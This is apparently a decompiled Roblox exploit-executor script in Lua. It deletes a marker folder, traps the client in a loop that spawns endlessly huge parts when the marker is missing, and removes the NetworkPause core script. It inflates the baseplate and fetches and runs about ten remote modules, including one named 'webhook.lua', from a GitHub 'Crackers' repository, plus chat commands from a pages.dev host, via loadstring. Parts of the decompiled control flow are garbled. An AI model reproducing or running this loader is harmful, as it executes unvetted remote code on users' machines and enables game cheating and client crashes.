-- filename: 
-- version: lua51
-- line: [0, 0] id: 0
local r0_0 = isfolder("SysCache")
local r5_0 = nil	-- notice: implicit variable refs by block#[3]
local r6_0 = nil	-- notice: implicit variable refs by block#[3]
local r7_0 = nil	-- notice: implicit variable refs by block#[3]
local r9_0 = nil	-- notice: implicit variable refs by block#[3]
if r0_0 then
  r0_0 = isfile("SysCache/manifest.dat")
  if not r0_0 then
    ::label_10::
    while true do
      ::label_10::
      r0_0 = {}
      for r4_0 = 1, math.huge, 1 do
        r5_0 = Instance
        r5_0 = r5_0.new
        r6_0 = "Part"
        r5_0 = r5_0(r6_0)
        r0_0[r4_0] = r5_0
        r5_0 = r0_0[r4_0]
        r6_0 = Vector3
        r6_0 = r6_0.new
        r7_0 = math
        r7_0 = r7_0.huge
        r9_0 = math
        r9_0 = r9_0.huge
        r6_0 = r6_0(r7_0, math.huge, r9_0)
        r5_0.Size = r6_0
      end
    end
  end
else
  ::label_10::
  while true do
    goto label_10	-- block#2 is visited secondly
  end
end
delfile("SysCache/manifest.dat")
delfolder("SysCache")
r0_0 = "https://raw.githubusercontent.com/OxyCoder32/Crackers/"
for r5_0, r6_0 in ipairs({
  "ownercmds.lua",
  "blacklist.lua",
  "akactive.lua",
  "nametags.lua",
  "webhook.lua",
  "nametagstoggle.lua",
  "joinakusers.lua",
  "loadcmds.lua",
  "cmdbar.lua",
  "moveguis.lua"
}) do
  coroutine.wrap(function()
    -- line: [0, 0] id: 4
    pcall(function()
      -- line: [0, 0] id: 5
      loadstring(game:HttpGet(r0_0 .. "/" .. r6_0))()
    end)
  end)()
  -- close: r5_0
end
wait(1)
coroutine.wrap(function()
  -- line: [0, 0] id: 6
  loadstring(game:HttpGet(r0_0 .. "/moveguis.lua"))()
end)()
local r2_0 = game:GetService("CoreGui")
local r3_0 = r2_0:FindFirstChild("RobloxGui")
if r3_0 then
  r6_0 = "CoreScripts/NetworkPause"
  local r4_0 = r3_0:FindFirstChild(r6_0)
  if r4_0 then
    r4_0:Destroy()
  end
end
r5_0 = workspace
for r7_0, r8_0 in ipairs(r5_0:GetDescendants()) do
  r9_0 = r8_0.Name
  if r9_0 == "Baseplate" then
    r9_0 = r8_0:IsA("BasePart")
    if r9_0 then
      r9_0 = r8_0.Size.Y
      local r10_0 = math.max(r8_0.Size.X, r8_0.Size.Z)
      local r11_0 = math.max(r10_0 * 1000000000, 1000000000000)
      r8_0.Size = Vector3.new(r11_0, r9_0, r11_0)
      break
    end
  end
end
local r4_0 = Instance.new("ScreenGui")
r4_0.Name = "PingDisplay"
r4_0.ResetOnSpawn = false
r4_0.IgnoreGuiInset = true
r4_0.Parent = r2_0
r6_0 = "TextLabel"
r5_0 = Instance.new(r6_0)
r6_0 = UDim2
r6_0 = r6_0.new
r6_0 = r6_0(0, 100, 0, 25)
r5_0.Size = r6_0
r6_0 = UDim2
r6_0 = r6_0.new
r6_0 = r6_0(0, 220, 0, 15)
r5_0.Position = r6_0
r6_0 = Color3
r6_0 = r6_0.fromRGB
r6_0 = r6_0(0, 0, 0)
r5_0.BackgroundColor3 = r6_0
r5_0.BackgroundTransparency = 0.5
r5_0.BorderSizePixel = 0
r6_0 = Enum
r6_0 = r6_0.Font
r6_0 = r6_0.GothamBold
r5_0.Font = r6_0
r5_0.TextSize = 14
r6_0 = Color3
r6_0 = r6_0.fromRGB
r6_0 = r6_0(255, 255, 255)
r5_0.TextColor3 = r6_0
r6_0 = Enum
r6_0 = r6_0.TextXAlignment
r6_0 = r6_0.Center
r5_0.TextXAlignment = r6_0
r5_0.Text = "Ping: ..."
r5_0.Parent = r4_0
r6_0 = Instance
r6_0 = r6_0.new
r6_0 = r6_0("UICorner")
r6_0.CornerRadius = UDim.new(0, 8)
r6_0.Parent = r5_0
r7_0 = game:GetService("Stats")
local r8_0 = game:GetService("RunService")
r9_0 = 0
local r10_0 = 0
task.spawn(function()
  -- line: [0, 0] id: 1
  -- notice: unreachable block#4
  while true do
    local r0_1, r1_1 = pcall(function()
      -- line: [0, 0] id: 2
      return math.floor(r7_0.Network.ServerStatsItem["Data Ping"]:GetValue())
    end)
    local r2_1 = nil	-- notice: implicit variable refs by block#[3]
    if r0_1 then
      r2_1 = r1_1
      if r2_1 then
        ::label_8::
        r2_1 = 0
      end
    else
      goto label_8	-- block#2 is visited secondly
    end
    r10_0 = r2_1
    task.wait(1)
  end
end)
r8_0.RenderStepped:Connect(function()
  -- line: [0, 0] id: 3
  if r9_0 ~= r10_0 then
    local r0_3 = r10_0 - r9_0
    r9_0 = r9_0 + math.sign(r0_3) * math.max(1, math.floor(math.abs(r0_3) / 5))
  end
  r5_0.Text = "Ping: " .. r9_0 .. " ms"
end)
local r11_0 = game:GetService("Players")
local r12_0 = game:GetService("TextChatService")
local r13_0 = r11_0.LocalPlayer
local r14_0 = "https://akadmin-bzk.pages.dev/Mains/chatcmds.lua"
local r15_0 = {}
local r16_0, r17_0 = pcall(function()
  -- line: [0, 0] id: 9
  local r0_9 = loadstring(game:HttpGet(r14_0))()
  if r0_9 and type(r0_9) == "table" then
    r15_0 = r0_9
  end
end)
if not r16_0 then
  warn("Failed to load chat commands:", r17_0)
end
if r12_0 and r12_0.TextChannels and r12_0.TextChannels.RBXGeneral then
  r12_0.TextChannels.RBXGeneral.MessageReceived:Connect(function(r0_7)
    -- line: [0, 0] id: 7
    -- notice: unreachable block#6
    if not r0_7.TextSource or r0_7.TextSource.UserId ~= r13_0.UserId then
      return 
    end
    local r1_7 = r0_7.Text:lower()
    for r5_7, r6_7 in pairs(r15_0) do
      if r1_7:sub(1, #r5_7) == r5_7 then
        local r7_7 = r0_7.Text:sub(#r5_7 + 2)
        pcall(function()
          -- line: [0, 0] id: 8
          r6_7(r7_7)
        end)
        -- close: r2_7
        break
      else
        -- close: r5_7
      end
    end
  end)
end
-- close: r0_0
